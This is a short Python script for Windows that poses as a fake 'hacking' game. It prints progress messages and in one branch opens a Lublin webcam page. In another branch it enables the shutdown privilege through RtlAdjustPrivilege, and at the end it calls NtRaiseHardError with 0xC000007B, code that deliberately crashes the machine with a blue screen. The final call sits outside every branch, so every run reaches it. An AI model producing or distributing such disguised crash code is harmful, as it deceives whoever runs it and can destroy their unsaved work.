import time
import webbrowser
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
import random

nullptr = POINTER(c_int)()

time.sleep(1)
print("Hacking started")
time.sleep(1)
print("Hacking in progress...")
a=0
b=random.randint(1, 3)
c=random.randint(1, 4)
if b == 1:
    while a<101:
        print(a)
        a=a+20
        time.sleep(0.5)
    print("hacking ended succesfully")
    webbrowser.open('https://lublin.eu/lublin/o-miescie/lublin-na-zywo/widok-na-plac-litewski/', new=2)
    
if b == 2:
    while a<101:
        print(a)
        a=a+20
        time.sleep(0.5)
    time.sleep(1)
    print("hacking failed")
if b ==3:
    time.sleep(c)
    print("you got hacked!")
    time.sleep(5)
    windll.ntdll.RtlAdjustPrivilege(
    c_uint(19), 
    c_uint(1), 
    c_uint(0), 
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B), 
    c_ulong(0), 
    nullptr, 
    nullptr, 
    c_uint(6), 
    byref(c_uint())
)
    